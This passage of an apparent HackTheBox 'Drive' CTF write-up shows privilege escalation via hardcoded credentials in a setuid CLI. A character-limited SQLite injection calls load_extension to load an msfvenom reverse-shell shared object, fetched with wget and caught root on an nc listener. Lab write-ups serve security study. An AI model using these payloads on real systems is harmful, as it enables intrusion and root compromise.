+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tom@drive:~$ ls -al
+</span></span><span class="line"><span class="cl">total 916
+</span></span><span class="line"><span class="cl">drwxr-x--- 6 tom  tom    4096 Sep 13 13:51 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 6 root root   4096 Dec 25  2022 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root root      9 Sep  6 02:56 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom     220 Dec 25  2022 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom    3771 Dec 25  2022 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ 3 tom  tom    4096 Jan  1  2023 .cache
+</span></span><span class="line"><span class="cl">drwx------ 3 tom  tom    4096 Feb  3  2023 .config
+</span></span><span class="line"><span class="cl">-rwSr-x--- 1 root tom  887240 Sep 13 13:36 doodleGrive-cli
+</span></span><span class="line"><span class="cl">drwx------ 3 tom  tom    4096 Jan  1  2023 .gnupg
+</span></span><span class="line"><span class="cl">drwxrwxr-x 3 tom  tom    4096 Dec 28  2022 .local
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom     807 Dec 25  2022 .profile
+</span></span><span class="line"><span class="cl">-rw-r----- 1 root tom     719 Feb 11  2023 README.txt
+</span></span><span class="line"><span class="cl">-rw-r----- 1 root tom      33 Oct 12 11:59 user.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom      39 Aug 29 05:59 .vimrc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The README provides details about the item:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Hi</span> <span class="n">team</span>
+</span></span><span class="line"><span class="cl"><span class="n">after</span> <span class="n">the</span> <span class="n">great</span> <span class="n">success</span> <span class="n">of</span> <span class="n">DoodleGrive</span><span class="p">,</span> <span class="n">we</span> <span class="n">are</span> <span class="n">planning</span> <span class="n">now</span> <span class="n">to</span> <span class="n">start</span> <span class="n">working</span> <span class="n">on</span> <span class="n">our</span> <span class="n">new</span> <span class="n">project</span><span class="p">:</span> <span class="s2">&#34;DoodleGrive self hosted&#34;</span><span class="p">,</span><span class="n">it</span> <span class="n">will</span> <span class="n">allow</span> <span class="n">our</span> <span class="n">customers</span> <span class="n">to</span> <span class="n">deploy</span> <span class="n">their</span> <span class="n">own</span> <span class="n">documents</span> <span class="n">sharing</span> <span class="n">platform</span> <span class="n">privately</span> <span class="n">on</span> <span class="n">thier</span> <span class="n">servers</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">However</span> <span class="ow">in</span> <span class="n">addition</span> <span class="n">with</span> <span class="n">the</span> <span class="s2">&#34;new self Hosted release&#34;</span> <span class="n">there</span> <span class="n">should</span> <span class="n">be</span> <span class="n">a</span> <span class="k">tool</span><span class="p">(</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span><span class="p">)</span> <span class="n">to</span> <span class="n">help</span> <span class="n">the</span> <span class="n">IT</span> <span class="n">team</span> <span class="ow">in</span> <span class="n">monitoring</span> <span class="n">server</span> <span class="n">status</span> <span class="ow">and</span> <span class="n">fix</span> <span class="n">errors</span> <span class="n">that</span> <span class="n">may</span> <span class="n">happen</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">As</span> <span class="n">we</span> <span class="n">mentioned</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">last</span> <span class="n">meeting</span> <span class="n">the</span> <span class="k">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span> <span class="ow">and</span> <span class="n">we</span> <span class="n">should</span> <span class="n">test</span> <span class="n">it</span> <span class="n">properly</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">We</span> <span class="n">sent</span> <span class="n">the</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">email</span> <span class="k">for</span> <span class="n">every</span> <span class="n">user</span> <span class="n">to</span> <span class="n">help</span> <span class="n">us</span> <span class="ow">in</span> <span class="n">testing</span> <span class="n">the</span> <span class="k">tool</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">better</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">If</span> <span class="n">you</span> <span class="n">face</span> <span class="n">any</span> <span class="n">problem</span><span class="p">,</span> <span class="n">please</span> <span class="n">report</span> <span class="n">it</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Best</span> <span class="n">regards</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It mentions credentials, but the email doesn&rsquo;t seem to exist on the box. Fortunately, since this is a binary (and non-stripped!), the user/password check should be baked-in. We can try strings to find this, but with a quick check into vim, I find it very fast by searching for password:
+<img src="/p/hackthebox-drive/Images/vim.png"
+	width="936"
+	height="170"
+	srcset="/p/hackthebox-drive/Images/vim_hu11869143428703186270.png 480w, /p/hackthebox-drive/Images/vim_hu17984051257463895005.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="550"
+		data-flex-basis="1321px"
+	
+>
+Using strings, we can splice out string contents. It is a lot, so I still find it best to save it to another file, open and vim and search this way:
+<img src="/p/hackthebox-drive/Images/vim2.png"
+	width="278"
+	height="108"
+	srcset="/p/hackthebox-drive/Images/vim2_hu6703160217659966517.png 480w, /p/hackthebox-drive/Images/vim2_hu7262238756303788105.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
+	
+>
+here we have creds as <code>moriarty:findMeIfY0uC@nMr.Holmz!</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tom</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="k">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="o">!</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">moriarty</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">moriarty</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">findMeIfY0uC</span><span class="err">@</span><span class="n">nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="n">Welcome</span><span class="o">...!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">doodleGrive</span> <span class="n">cli</span> <span class="n">beta</span><span class="o">-</span><span class="mf">2.2</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">Show</span> <span class="n">users</span> <span class="n">list</span> <span class="ow">and</span> <span class="n">info</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">Show</span> <span class="n">groups</span> <span class="n">list</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="n">Check</span> <span class="n">server</span> <span class="n">health</span> <span class="ow">and</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="n">Show</span> <span class="n">server</span> <span class="n">requests</span> <span class="nb">log</span> <span class="p">(</span><span class="n">last</span> <span class="mi">1000</span> <span class="n">request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mf">5.</span> <span class="n">activate</span> <span class="n">user</span> <span class="n">account</span>
+</span></span><span class="line"><span class="cl"><span class="mf">6.</span> <span class="n">Exit</span>
+</span></span><span class="line"><span class="cl"><span class="n">Select</span> <span class="n">option</span><span class="p">:</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It works! Now we have to figure out what to do.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Select option: 1
+</span></span><span class="line"><span class="cl">          id = 16
+</span></span><span class="line"><span class="cl">  last_login = 2023-02-11 07:46:11.212535
+</span></span><span class="line"><span class="cl">is_superuser = 1
+</span></span><span class="line"><span class="cl">    username = admin
+</span></span><span class="line"><span class="cl">       email = admin@drive.htb
+</span></span><span class="line"><span class="cl">    is_staff = 1
+</span></span><span class="line"><span class="cl">   is_active = 1
+</span></span><span class="line"><span class="cl"> date_joined = 2022-12-08 14:59:02.802351
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">          id = 29
+</span></span><span class="line"><span class="cl">  last_login = 2023-10-15 15:58:04.498985
+</span></span><span class="line"><span class="cl">is_superuser = 0
+</span></span><span class="line"><span class="cl">    username = asdf
+</span></span><span class="line"><span class="cl">       email = asdf@asdf.asdf
+</span></span><span class="line"><span class="cl">    is_staff = 0
+</span></span><span class="line"><span class="cl">   is_active = 1
+</span></span><span class="line"><span class="cl"> date_joined = 2023-10-15 15:03:29.237892
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It is apparent that the program it is pulling data from the web service. Also within the strings, we might find commands related to the commands.</p>
+<h3 id="sql-injection-to-load-a-malicious-shared-object-file">SQL injection to load a malicious shared object file
+</h3><p>For activating a user account, we can find it allows for user input:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sqlite3</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">DoodleGrive</span><span class="o">/</span><span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span> <span class="o">-</span><span class="n">line</span> <span class="s1">&#39;UPDATE accounts_customer SET is_active=1 WHERE username=&#34;</span><span class="si">%s</span><span class="s1">&#34;&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Injecting SQL to bypass table checking is not helpful for us, but we might <a class="link" href="https://github.com/mpaolino/sqlite-execute-module"  target="_blank" rel="noopener"
+    >use SQL injection for remote command execution</a>. However, when checking tricks for this, we quickly find out we are limited in characters. Testing the character limit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">doodleGrive cli beta-2.2:
+</span></span><span class="line"><span class="cl">1. Show users list and info
+</span></span><span class="line"><span class="cl">2. Show groups list
+</span></span><span class="line"><span class="cl">3. Check server health and status
+</span></span><span class="line"><span class="cl">4. Show server requests log (last 1000 request)
+</span></span><span class="line"><span class="cl">5. activate user account
+</span></span><span class="line"><span class="cl">6. Exit
+</span></span><span class="line"><span class="cl">Select option: 5
+</span></span><span class="line"><span class="cl">Enter username to activate account: 1234567890123456789012345678901234567890
+</span></span><span class="line"><span class="cl">Activating account for user &#39;123456789012345678901234567890123456789&#39;...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When supplying a string of 40 characters, only 39 is returned. We should assume that we can only work with a maximum of 39 characters. Our long UNION SELECT payload is not quite viable anymore. Additionally, several characters are not allowed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">doodleGrive cli beta-2.2:
+</span></span><span class="line"><span class="cl">1. Show users list and info
+</span></span><span class="line"><span class="cl">2. Show groups list
+</span></span><span class="line"><span class="cl">3. Check server health and status
+</span></span><span class="line"><span class="cl">4. Show server requests log (last 1000 request)
+</span></span><span class="line"><span class="cl">5. activate user account
+</span></span><span class="line"><span class="cl">6. Exit
+</span></span><span class="line"><span class="cl">Select option: 5
+</span></span><span class="line"><span class="cl">Enter username to activate account: \/|&#39;;..
+</span></span><span class="line"><span class="cl">Activating account for user &#39;..&#39;...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note that out of all the special characters provided in the username input, only dots were accepted and reflected. We can work around banned characters utilizing the <a class="link" href="https://www.w3resource.com/sqlite/core-functions-char.php"  target="_blank" rel="noopener"
+    >char function</a>, but working around the character limit also requires creativity. Instead of combining our payload using <code>AND JOIN</code> or other ideas, we can simplify it with <code>+</code>. First, when we must create our malicious shared object file, which will behave as our linux equivalent to a <code>dll</code> loading:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive/sqlite_ex/sqlite-execute-module]
+</span></span><span class="line"><span class="cl">└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=4444 -f elf-so -o a.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, we must download it to the same file location as <code>doodleGrive-cli</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tom@drive:~$ wget 10.10.14.21/a.so
+</span></span><span class="line"><span class="cl">--2023-10-16 02:46:13--  http://10.10.14.21/a.so
+</span></span><span class="line"><span class="cl">Connecting to 10.10.14.21:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
+</span></span><span class="line"><span class="cl">Length: 476 [application/octet-stream]
+</span></span><span class="line"><span class="cl">Saving to: ‘a.so’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">a.so                          100%[==============================================&gt;]     476  --.-KB/s    in 0s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-10-16 02:46:13 (20.4 MB/s) - ‘a.so’ saved [476/476]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The small file name is really important, as we must call the characters in our <code>load_extension</code> payload. Unless specified, the file extension .so will be appended automatically. This is important for us as we need to minimize the payload characters where possible. For my file, I will want to do load_extension(./a). Looking up the characters on the <a class="link" href="https://www.asciitable.com/"  target="_blank" rel="noopener"
+    >ascii table</a>, my payload will look like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s2">&#34;+load_extension(char(46,47,97))--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, running the payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tom</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="k">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="o">!</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">moriarty</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">moriarty</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">findMeIfY0uC</span><span class="err">@</span><span class="n">nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="n">Welcome</span><span class="o">...!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">doodleGrive</span> <span class="n">cli</span> <span class="n">beta</span><span class="o">-</span><span class="mf">2.2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">Show</span> <span class="n">users</span> <span class="n">list</span> <span class="ow">and</span> <span class="n">info</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">Show</span> <span class="n">groups</span> <span class="n">list</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="n">Check</span> <span class="n">server</span> <span class="n">health</span> <span class="ow">and</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="n">Show</span> <span class="n">server</span> <span class="n">requests</span> <span class="nb">log</span> <span class="p">(</span><span class="n">last</span> <span class="mi">1000</span> <span class="n">request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mf">5.</span> <span class="n">activate</span> <span class="n">user</span> <span class="n">account</span>
+</span></span><span class="line"><span class="cl"><span class="mf">6.</span> <span class="n">Exit</span>
+</span></span><span class="line"><span class="cl"><span class="n">Select</span> <span class="n">option</span><span class="p">:</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">username</span> <span class="n">to</span> <span class="n">activate</span> <span class="n">account</span><span class="p">:</span> <span class="s2">&#34;+load_extension(char(46,47,97))--</span>
+</span></span><span class="line"><span class="cl"><span class="n">Activating</span> <span class="n">account</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;&#34;+load_extension(char(46,47,97))--&#39;</span><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my nc listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive/sqlite_ex/sqlite-execute-module]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.21] from (UNKNOWN) [10.10.11.235] 55348
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root),1003(tom)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With this, we have full root authority.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/gitea/">Gitea</a>
+        
+            <a href="/tags/idor/">IDOR</a>
+        
+            <a href="/tags/sqlite/">SQLite</a>
+        
+            <a href="/tags/sql-injection/">SQL Injection</a>
+        
+            <a href="/tags/port-forwarding/">Port Forwarding</a>
+        
+            <a href="/tags/msfvenom/">Msfvenom</a>
+        
+            <a href="/tags/ffuf/">FFUF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-pc/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-pc/PC.9698f9fd3d85128380dd064aec557744_hu12859984063434525790.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - PC"
+                        
+                        data-hash="md5-lpj5/T2FEoOA3QZK7FV3RA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - PC</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-visual/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-visual/Visual.161f7ee3284e2802b170218feede8443_hu4542438820556627261.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Visual"
+                        
+                        data-hash="md5-Fh9&#43;4yhOKAKxcCGP7t6EQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Visual</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-onlyforyou/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hu13502282750288352538.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou"
+                        
+                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-mailroom/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu4146993554582274269.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Mailroom"
+                        
+                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Mailroom</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-busqueda/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-busqueda/Busqueda.fc4856cd6b9e5aa954d7face3968a69d_hu12336566156959704981.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Busqueda"
+                        
+                        data-hash="md5-/EhWzWueWqlU1/rOOWimnQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Busqueda</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
